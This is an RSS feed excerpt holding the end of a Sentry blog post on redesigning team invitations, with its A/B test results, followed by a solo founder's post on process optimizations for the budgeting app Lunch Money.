https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=761 761w" sizes="(max-width: 761px) 100vw, 761px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=190 190w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=381 381w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=761 761w" sizes="(max-width: 761px) 100vw, 761px">
          <img alt="3-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>While modals are sometimes overused in web applications, we believed this approach would solve our key discoverability and navigation concerns: it can be shown contextually without leaving the current page, and completing the form returns you to what you were doing.</p>
<p>To that point, we additionally introduced buttons to launch this <em>Invite New Members</em> modal contextually throughout Sentry:</p>
<ul>
<li>Viewing an issue and notice a <a href="https://docs.sentry.io/workflow/releases/?platform=node#after-associating-commits">suspect commit</a> made by a coworker? If they’re not already part of your Sentry organization, you can now invite them then and there.</li>
<li>Trying to assign an issue to a team member, but don’t see their name in the assignee list? You now have the option to invite them right in the dropdown.</li>
<li>Creating a new team? Now you can invite new members directly to that team as you go.</li>
</ul>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/60GpNeFNg4toier5a02zh4/ba868de307b0dcc6764805901b0b6e93/4-invitations.png" alt="" title="4-invitations"></p><figcaption><p>Example contextual link that launches the Invite New Members modal</p></figcaption></figure><div>
<h2 id="democratizing-invitations"><a href="#democratizing-invitations" aria-label="democratizing invitations permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Democratizing invitations</h2>
<p>As we began rolling out our new <em>Invite New Members</em> experience across the application, we came to a sobering realization: only roughly <strong><em>half</em></strong> of Sentry users could actually use our new modal. That’s because historically, only those with Owner or Manager-level permissions could invite other team members. Combined, users with these permissions accounted for less than 50% of active users.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=123 123w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=245 245w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=490 490w" sizes="(max-width: 490px) 100vw, 490px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=123 123w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=245 245w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=490 490w" sizes="(max-width: 490px) 100vw, 490px">
          <img alt="5-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>Restricting the ability to add new users to account administrators is pretty common practice for software tools, and Sentry is no exception. When an employee onboards on a new team, it’s common to see an exchange like this:</p>
<blockquote>
<p>Alice: Oh awesome, we use Sentry. Can you add me to the organization?
Bob: Ah, I can’t invite you. Maybe ask Jen?</p>
</blockquote>
<p>In a perfect world, one of your administrators is tracked down, and they manually add the new teammate to the account. But sometimes that person is unknown, or is on a vacation, or maybe it takes them days or weeks or even months.</p>
<p>We began asking ourselves: what if we could unlock team members to fast-track this whole process and invite members themselves? This led to our next major change: updating our permission model to allow for <strong>members to request to invite other members.</strong></p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=185 185w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=369 369w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=738 738w" sizes="(max-width: 738px) 100vw, 738px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=185 185w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=369 369w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=738 738w" sizes="(max-width: 738px) 100vw, 738px">
          <img alt="6-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a>  </p>
<p>Now, when non-administrators open up the Invite New Members modal, it changes contextually to become a “request to invite” rather than a direct invitation. Hitting “send” kicks off an email to all organization administrators, who are prompted to approve any outstanding requests.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4oi9gYhVX185djAJWppP3Q/ff565fcd34cf00c3a60a32c5ec0cde7b/7-invitations.png" alt="" title="7-invitations"></p><figcaption><p>Organization owners and managers can see pending invitation requests.</p></figcaption></figure><div>
<p>At this point, we had built what we thought was a fantastic new user experience and we just <em>doubled</em> the number of users who could take advantage of it. But this exercise of opening up user invitations got us thinking: what if there was an even <em>further</em> source of untapped users we weren’t reaching?</p>
<h2 id="removing-the-middleman-entirely"><a href="#removing-the-middleman-entirely" aria-label="removing the middleman entirely permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Removing the middleman entirely</h2>
<p>In the last section, we highlighted a scenario where one teammate asks another teammate for access to Sentry. And because of our recent changes, users can request to invite their teammates themselves instead of having to track down and ask their account administrator.</p>
<p>But this scenario still has a gatekeeping element: the new teammate has to ask <em>another</em> teammate for access. What if the new teammate spots an alert from Sentry in Slack stemming from their recent changes, and no one’s around to grant them access? Unfortunately, they’d land on an authentication wall that would prevent them from going any further.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=112 112w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=225 225w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=449 449w" sizes="(max-width: 449px) 100vw, 449px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=112 112w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=225 225w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=449 449w" sizes="(max-width: 449px) 100vw, 449px">
          <img alt="8-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>This begged the question: was there an untapped source of potential users we weren’t reaching by restricting invitations <em>only</em> to active Sentry users? What if new users didn’t have to ask anyone at all?</p>
<p>So, to keep this party going, we dug in and additionally made it possible for <strong>external users to request to join an organization</strong>.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/6mRCkcVZkkAlZ0ELzWUGHr/3123b1113330661bc7ee5023aa5ef54c/9-invitations.png" alt="" title="9-invitations"></p><figcaption><p>The “Request to Join” button has been added to the organization login page, allowing</p></figcaption></figure><div>
<p>Now when a user lands on an Organization’s login page, they have the option to “Request to join”, which asks for the user’s name and email address. Once they hit send, the organization owners are sent an email that prompts them to approve the join request. Just in case, there’s also a call-to-action to disable the feature entirely for their organization.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=165 165w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=330 330w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=660 660w" sizes="(max-width: 660px) 100vw, 660px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=165 165w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=330 330w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=660 660w" sizes="(max-width: 660px) 100vw, 660px">
          <img alt="10-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>Having developed a new contextual invitation modal and a pair of invite-friendly permission changes, we were <em>feeling</em> confident that these changes were going to have a strong impact on user behavior. It was time now to put our money where our code was, and verify that all this hard work actually moved the needle.</p>
<h2 id="ab-testing-the-impact"><a href="#ab-testing-the-impact" aria-label="ab testing the impact permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>A/B testing the impact</h2>
<p>Our standard procedure for validating the efficacy of product changes is through A/B testing (also known as split testing). This means instrumenting our application code to serve different experiences to segments of users over the same time period, and comparing the results. This step takes extra effort, but it’s worth it –&nbsp;the alternative is to settle for a before-and-after snapshot of data, which is too easily impacted by external factors like seasonality or marketing pushes.</p>
<p>ℹ️ <em>To learn more about how we perform A/B testing at Sentry, please see <a href="https://blog.sentry.io/2019/05/09/easy-ab-testing-with-planout">this earlier blog post</a>.</em></p>
<p>It’s easy to get carried away with A/B testing, and having so many permutations that you don’t have enough data to be statistically significant. So, to simplify things, we decided that all treatments would get the new modal experience, and our “treatment” groups would focus on the new permission changes.</p>
<p>This left us with 4 distinct treatments that we rolled out to 4 equally-sized customer segments:</p>
<ol>
<li><strong>Baseline</strong> (new modal only)</li>
<li><strong>Request to Invite</strong> (user invites another user)</li>
<li><strong>Request to Join</strong> (external user requests to join)</li>
<li><strong><em>Both</em></strong> Request to Invite and Request to Join are enabled together</li>
</ol>
<p>Our main criteria for determining success: which of these treatments would result in <strong>an increase in <em>accepted</em> invitations</strong> (and thus new users)?</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/rlobEVJ4FCzWbU1tmPqqb/8ed779f9a63aa3382e5590cfa8e4bec1/11-invitations_2_.png" alt="" title="11-invitations"></p><figcaption><p>% of accepted invitations relative to baseline</p></figcaption></figure><div>
<p>After 30 days, the results became clear (not to mention, statistically significant):</p>
<ul>
<li><strong>11%</strong> more users accepted invitations in the <em>Request to Invite</em> treatment vs. the baseline</li>
<li><strong>9%</strong> more users accepted invitations in the <em>Request to Join</em> treatment vs. the baseline</li>
<li><strong>21%</strong> more users accepted invitations who had both <em>Request to Invite</em> and <em>Request to Invite</em> treatments enabled</li>
</ul>
<p>It’s probably not a surprise that allowing a wider set of users to invite team members resulted in more users inviting team members. It’s also probably not a surprise that enabling both feature sets at the same time was even better (given that they complement each other)!</p>
<h2 id="turning-users-into-active-users"><a href="#turning-users-into-active-users" aria-label="turning users into active users permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Turning users into active users</h2>
<p>Having more users join your platform is great, but what’s the point if those users never actually <em>use</em> the product? To be truly confident …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations">https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations</a></em></p>]]>
            </description>
            <link>https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations</link>
            <guid isPermaLink="false">hacker-news-small-sites-23841049</guid>
            <pubDate>Wed, 15 Jul 2020 03:42:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$45k ARR in 10 months: Optimizations as a company of one]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23840321">thread link</a>) | @jnfr
<br/>
July 14, 2020 | https://lunchbag.ca/company-of-one | <a href="https://web.archive.org/web/*/https://lunchbag.ca/company-of-one">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<p><span>
				Written on <time datetime="2020-05-18 16:00:00 +0000 UTC">May 18, 2020</time>
			</span>
		</p>
		

<p>Hello! 👋 My name is Jen and I’m the founder, engineer, designer and customer support at <a href="https://lunchmoney.app/">Lunch Money</a>, a personal finance and budgeting web app.</p>

<p>In short, I am a company of one. I answer the customer support emails and I code and deploy new features. I also manage the <a href="https://developers.lunchmoney.app/" target="_blank">API docs</a> and <a href="https://support.lunchmoney.app/" target="_blank">knowledge base</a>, poke around the logs when there are issues, write the <a href="https://lunchmoney.app/sample_newsletter" target="_blank">bi-monthly newsletters</a> and I designed the logo!</p>

<p>As the company scales, so too must all aspects of my work which I break down into 4 parts: customer support, engineering, product and marketing.</p>

<p><strong>Finding opportunities for process optimization is honestly one of the more fun parts of running a business</strong>. I greatly attribute these to how I’ve been able to stay both solo &amp; sane up until now, currently with 600+ users and $45,000 ARR. In this post, I’m excited to share some of my most successful strategies along with anecdotes from my experience working on Lunch Money.</p>



<p>In the last 14 days, here’s what I got done across all departments:</p>

<ul>
<li><strong>Product:</strong> Launched an internal beta testers program and two sets of new features to test</li>
<li><strong>Engineering:</strong> Wrapped up a 2-week long refactor of some core components on the client-side</li>
<li><strong>Engineering:</strong> Launched a major feature: advanced transaction filters</li>
<li><strong>Engineering:</strong> Closed 13 tickets related to feature improvements and bug fixes</li>
<li><strong>Marketing:</strong> Sent out a newsletter outlining the latest new features</li>
<li><strong>Marketing:</strong> This blog post</li>
<li><strong>Marketing:</strong> Added new pages to the marketing site (<a href="https://lunchmoney.app/features/rules">Rules</a> and <a href="https://lunchmoney.app/features/collaboration">Collaboration</a>) and updated the icons in <a href="https://lunchmoney.app/features">Features</a></li>
<li><strong>Support:</strong> Received 239 inbound support tickets and sent out 358 emails</li>
</ul>

<p>What makes all this work bearable for me is the fact that there is so much variety (which, of course, is the spice of life!). I love being able to switch between tasks to keep the job interesting and my mind refreshed while still being productive overall.</p>

<p><em>Case in point: I just finished a major refactor and pushed out 2 major features to beta, so writing this blog post right now feels like a vacation for my brain.</em></p>

<p>To state the obvious, I enjoy being hyper-efficient (without burning myself out, of course). Even though I am a single person, I can still automate, optimize and parallelize processes.</p>



<h2 id="implement-safeguards">Implement safeguards</h2>

<p><i>Ah, the blissful beginnings of Lunch Money when I’d push code directly to production several times a day.</i></p>

<p>At 500+ users now, those days are long gone and I’ve since needed to adopt the more boring but responsible approach of implementing safeguards to prevent shipping faulty code.</p>

<p>For one, <b>I’ve been thoroughly reviewing my own code before every change</b>. Every major feature, improvement and bug fix lives in a feature branch that I still, by habit from the corporate days, prepend with <code>jen/</code>. After verifying everything works great locally, I make sure to take a break first, whether that’s working on a completely unrelated task, going for a meal or going to bed. The point of this is to ensure that I’m code reviewing with a clear head.</p>

<p>While adhering to these standards of code reviewing myself may add extra time to my overall process, it potentially saves hours of bug-fixing, answering related support tickets and self-loathing (I’m half-kidding here) down the line if I accidentally ship bad code.</p>

<center><blockquote><p lang="en" dir="ltr">New phase of Lunch Money– no more pushing major features straight to production 🤯😂 <a href="https://t.co/RYsz7BnU3L">https://t.co/RYsz7BnU3L</a></p>— Jen (@lunchbag) <a href="https://twitter.com/lunchbag/status/1256987437600927744?ref_src=twsrc%5Etfw">May 3, 2020</a></blockquote> </center>

<p><b>I also recently implemented an internal beta-testing program open to Lunch Money subscribers.</b> With more users accessing my app on a regular basis, the stakes are higher to ship a version that’s as bug-free as possible.</p>

<p>As an engineering team of one, it’s nearly impossible to always get it right the first time, despite having tests (what if I missed an edge case?) or testing locally extensively (how I think my users will use a feature is not always so).</p>

<p>The beta-testing program has provided some additional benefits. It’s nice to have a cohort of users with whom I can have a more candid conversation about Lunch Money and it’s also a great way to show users that their feedback is valued!</p>

<h2 id="automate-later-than-you-need-to">Automate later than you need to</h2>

<p>While automating tasks can save a lot of time in the long-term, it doesn’t always make sense to automate right off the bat.</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png"><span>Obligatory XKCD comic (<a href="https://xkcd.com/1205/" target="_blank">link</a>)</span></p>

<p>Automating too late is not a bad thing. I’ll have done the manual work enough times to understand how to eventually automate the task and what edge cases to look out for. I equate it to doing a job yourself before hiring someone– it’s always better to grok the requirements first to some degree so you can understand how to best utilize who you’ve brought on (and appreciate them more!).</p>

<p>I manually triggered the emails for bi-monthly account summaries for months because I wasn’t confident the sending cadence was reasonable. After observing open rates and collecting user feedback, these are now automated to go out on the 5th &amp; 25th of every month.</p>

<p>Something that I’m glad I didn’t spend the time to automate at all was the referral program. If an existing user refers a new user and the new user subscribes to a plan, then both users will receive credit for 1 month.</p>

<p>In the end, the referral program only brought on 11 extra users. It was not a pain at all to manually process rewards for those who did. If I had spent time conjuring up all the edge cases and automating this process, it would not have been worth the time investment.</p>

<h2 id="keep-low-hanging-fruits-in-the-back-pocket">Keep low-hanging fruits in the back pocket</h2>

<p>In my task management system, I use a tag (🍏) to denote which tasks are low-hanging fruits. For the uninitiated, low-hanging fruits are quick tasks that are easy to knock out, such as one-liners or 5-minute fixes.</p>

<p><img src="https://media.giphy.com/media/YP1Jb0JNc7kqFDbdjm/giphy.gif"></p>

<p>I find that keeping these around and tackling them on days when you feel generally unmotivated can really help raise spirits. Still being able to get something completed and shipped is a great way to get out of a slump.</p>



<h2 id="timing-marketing-pushes">Timing marketing pushes</h2>

<p>At Lunch Money, a big part of the business is using the services of Plaid for bank syncing. Plaid charges on a monthly basis which means that if a user signs up on April 30, connects a bank account immediately and doesn’t end up subscribing at the end of their 14-day trial, they will charge me for this user in both April &amp; May’s invoices.</p>

<p>This realization coupled with my intense aversion to paying more than I need to has shaped a lot of practices at Lunch Money.</p>

<p>For one, the data retention policy used to be 30 days which means if your trial ends and you didn’t put in your billing information, your data will be deleted in 30 days. This certainly guarantees that I’ll be overpaying for churned users and is the reason why the data retention policy has since been revised to 5 days.</p>

<p>In total, a user who does not end up subscribing can spend up to 26 days in the Lunch Money system. This comprises of a 14-day trial, the potential for a 1 week trial extension and a 5 day grace period. Assuming enough users connect their bank accounts, the best way to minimize my costs for churned users is to ensure their lifetimes are within one calendar month.</p>

<p><img src="https://lunchbag.ca/uploads/calendar-1.png"></p>

<p>As a result, I always schedule marketing pushes such as blog posts and product launches in the first few days of the month. When I came to this realization, my next Plaid bill went down for the first time.</p>

<h2 id="merging-marketing-and-engineering-for-a-combo-win">Merging marketing and engineering for a combo win</h2>

<p>Taking this a step further, the perk of having a spike in new users is that their trial periods more-or-less overlap. Usually when a new user signs up, they will poke around the product and maybe send in a bug report, a feature request or another piece of feedback. If I reply and address their feedback by putting in a fix or shipping their requested feature within days, more often than not, they end up converting into a happy customer.</p>

<p>I’ve therefore identified the following cycle to maximize potential conversions from spikes in user signups:</p>

<p><img src="https://lunchbag.ca/uploads/gantt-2.png"></p>

